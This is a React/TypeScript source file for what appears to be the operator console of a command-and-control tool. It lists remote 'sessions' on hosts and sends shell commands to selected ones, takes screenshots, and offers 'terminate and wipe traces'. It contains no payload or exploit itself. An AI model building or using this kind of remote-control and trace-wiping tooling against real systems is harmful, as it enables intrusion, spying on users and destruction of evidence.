import { useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import { useCampaignStore } from "../store/campaignStore";
import { useTaskStore } from "../store/taskStore";
import { invoke } from "@tauri-apps/api/tauri";
import {
  Terminal,
  Monitor,
  FileUp,
  FileDown,
  Power,
  AlertTriangle,
  CheckCircle,
  Clock,
} from "lucide-react";

export function SessionViewer() {
  const { id } = useParams<{ id: string }>();
  const { currentCampaign, selectCampaign, refreshSessions } = useCampaignStore();
  const { executeTask } = useTaskStore();
  const [selectedSessions, setSelectedSessions] = useState<Set<string>>(new Set());
  const [command, setCommand] = useState("");
  const [output, setOutput] = useState<{ sessionId: string; output: string }[]>([]);

  useEffect(() => {
    if (id) {
      selectCampaign(id);
      const interval = setInterval(refreshSessions, 5000);
      return () => clearInterval(interval);
    }
  }, [id]);

  if (!currentCampaign) {
    return <div className="text-white">Loading...</div>;
  }

  const { campaign, sessions, statistics } = currentCampaign;

  const handleExecuteCommand = async () => {
    if (!command.trim() || selectedSessions.size === 0) return;

    const promises = Array.from(selectedSessions).map(async (sessionId) => {
      try {
        const taskId = await invoke("execute_shell", {
          campaignId: campaign.id,
          sessionId,
          command,
        });
        
        // Poll for result
        const checkResult = async () => {
          const result = await invoke<any>("get_task_result", { taskId });
          if (result.status === 2) { // Completed
            setOutput((prev) => [
              ...prev,
              {
                sessionId,
                output: new TextDecoder().decode(result.output),
              },
            ]);
          } else if (result.status === 3 || result.status === 4) { // Failed or Timeout
            setOutput((prev) => [
              ...prev,
              {
                sessionId,
                output: `Error: ${result.error || "Task failed"}`,
              },
            ]);
          } else {
            setTimeout(checkResult, 1000);
          }
        };
        
        setTimeout(checkResult, 1000);
      } catch (err) {
        console.error("Failed to execute command:", err);
      }
    });

    await Promise.all(promises);
    setCommand("");
  };

  const handleTerminate = async (sessionId: string, wipe: boolean) => {
    if (!confirm(`Terminate session${wipe ? " and wipe traces" : ""}?`)) return;
    
    try {
      await invoke("terminate_session", { sessionId, wipe });
      refreshSessions();
    } catch (err) {
      alert("Failed to terminate session: " + err);
    }
  };

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-3xl font-bold text-white">{campaign.name}</h1>
          <div className="flex items-center gap-4 mt-2 text-sm text-gray-400">
            <span className="flex items-center gap-1">
              <CheckCircle className="w-4 h-4 text-green-400" />
              {statistics.active_sessions} Active
            </span>
            <span className="flex items-center gap-1">
              <Clock className="w-4 h-4 text-yellow-400" />
              {statistics.stale_sessions} Stale
            </span>
            <span className="flex items-center gap-1">
              <AlertTriangle className="w-4 h-4 text-red-400" />
              {statistics.terminated_sessions} Terminated
            </span>
          </div>
        </div>
      </div>

      {/* Session Grid */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        <div className="lg:col-span-2 space-y-4">
          <div className="bg-gray-800 rounded-xl border border-gray-700 overflow-hidden">
            <div className="p-4 border-b border-gray-700 flex items-center justify-between">
              <h2 className="font-semibold text-white">Active Sessions</h2>
              <div className="flex items-center gap-2">
                <button
                  onClick={() => setSelectedSessions(new Set(sessions.map((s) => s.id)))}
                  className="text-xs text-red-400 hover:text-red-300"
                >
                  Select All
                </button>
                <button
                  onClick={() => setSelectedSessions(new Set())}
                  className="text-xs text-gray-400 hover:text-gray-300"
                >
                  Clear
                </button>
              </div>
            </div>
            <div className="divide-y divide-gray-700 max-h-96 overflow-auto">
              {sessions.map((session) => (
                <div
                  key={session.id}
                  className={`p-4 flex items-center gap-4 hover:bg-gray-700/50 transition-colors ${
                    selectedSessions.has(session.id) ? "bg-red-900/20" : ""
                  }`}
                >
                  <input
                    type="checkbox"
                    checked={selectedSessions.has(session.id)}
                    onChange={(e) => {
                      const newSelected = new Set(selectedSessions);
                      if (e.target.checked) {
                        newSelected.add(session.id);
                      } else {
                        newSelected.delete(session.id);
                      }
                      setSelectedSessions(newSelected);
                    }}
                    className="w-4 h-4 rounded border-gray-600 text-red-600 focus:ring-red-500"
                  />
                  <div className="flex-1">
                    <div className="flex items-center gap-2">
                      <span className="font-medium text-white">{session.hostname}</span>
                      <span className="text-xs text-gray-400">({session.username})</span>
                    </div>
                    <div className="text-xs text-gray-500 mt-1">
                      PID: {session.process_id} • {session.os_version}
                    </div>
                    <div className="text-xs text-gray-500">
                      Last seen: {new Date(session.last_seen).toLocaleTimeString()}
                    </div>
                  </div>
                  <div className="flex items-center gap-2">
                    <button
                      onClick={() => handleTerminate(session.id, false)}
                      className="p-2 bg-red-600/20 hover:bg-red-600/30 text-red-400 rounded transition-colors"
                      title="Terminate"
                    >
                      <Power className="w-4 h-4" />
                    </button>
                    <button
                      onClick={() => handleTerminate(session.id, true)}
                      className="p-2 bg-red-600/20 hover:bg-red-600/30 text-red-400 rounded transition-colors"
                      title="Terminate & Wipe"
                    >
                      <AlertTriangle className="w-4 h-4" />
                    </button>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Command Console */}
          <div className="bg-gray-800 rounded-xl border border-gray-700 p-4">
            <h3 className="font-semibold text-white mb-4 flex items-center gap-2">
              <Terminal className="w-5 h-5" />
              Command Console ({selectedSessions.size} selected)
            </h3>
            <div className="flex gap-2">
              <input
                type="text"
                value={command}
                onChange={(e) => setCommand(e.target.value)}
                onKeyPress={(e) => e.key === "Enter" && handleExecuteCommand()}
                placeholder="Enter command to execute on selected sessions..."
                className="flex-1 px-4 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white focus:ring-2 focus:ring-red-500"
              />
              <button
                onClick={handleExecuteCommand}
                disabled={!command.trim() || selectedSessions.size === 0}
                className="px-4 py-2 bg-red-600 hover:bg-red-700 disabled:bg-gray-600 text-white font-medium rounded-lg transition-colors"
              >
                Execute
              </button>
            </div>

            {/* Output */}
            {output.length > 0 && (
              <div className="mt-4 space-y-2 max-h-64 overflow-auto">
                {output.map((out, idx) => (
                  <div key={idx} className="bg-gray-900 rounded p-3 font-mono text-sm">
                    <div className="text-gray-400 text-xs mb-1">
                      {sessions.find((s) => s.id === out.sessionId)?.hostname}
                    </div>
                    <pre className="text-green-400 whitespace-pre-wrap">{out.output}</pre>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>

        {/* Quick Actions */}
        <div className="space-y-4">
          <div className="bg-gray-800 rounded-xl border border-gray-700 p-4">
            <h3 className="font-semibold text-white mb-4">Quick Actions</h3>
            <div className="space-y-2">
              <ActionButton
                icon={Monitor}
                label="Screenshot"
                onClick={() => {
                  selectedSessions.forEach((id) => {
                    invoke("create_task", {
                      campaignId: campaign.id,
                      sessionId: id,
                      taskType: "screenshot",
                      payload: [],
                      timeout: 30,
                    });
                  });
                }}
                disabled={selectedSessions.size === 0}
              />
              <ActionButton
                icon={FileUp}
                label="Upload File"
                onClick={() => {
                  // Open file dialog and upload
                }}
                disabled={selectedSessions.size === 0}
              />
              <ActionButton
                icon={FileDown}
                label="Download File"
                onClick={() => {
                  // Prompt for remote path
                }}
                disabled={selectedSessions.size === 0}
              />
            </div>
          </div>

          <div className="bg-gray-800 rounded-xl border border-gray-700 p-4">
            <h3 className="font-semibold text-white mb-4">Campaign Info</h3>
            <div className="space-y-2 text-sm">
              <div className="flex justify-between">
                <span className="text-gray-400">ID</span>
                <span className="text-gray-300 font-mono">{campaign.id}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-400">Status</span>
                <span className="text-gray-300">{["Planning", "Active", "Paused", "Closing", "Archived"][campaign.status]}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-400">Created</span>
                <span className="text-gray-300">
                  {new Date(campaign.created_at).toLocaleDateString()}
                </span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-400">Duration</span>
                <span className="text-gray-300">
                  {Math.floor(statistics.duration_seconds / 3600)}h{" "}
                  {Math.floor((statistics.duration_seconds % 3600) / 60)}m
                </span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

function ActionButton({
  icon: Icon,
  label,
  onClick,
  disabled,
}: {
  icon: any;
  label: string;
  onClick: () => void;
  disabled: boolean;
}) {
  return (
    <button
      onClick={onClick}
      disabled={disabled}
      className="w-full flex items-center gap-3 px-4 py-3 bg-gray-700 hover:bg-gray-600 disabled:bg-gray-800 disabled:text-gray-500 text-white rounded-lg transition-colors text-left"
    >
      <Icon className="w-5 h-5" />
      <span>{label}</span>
    </button>
  );
}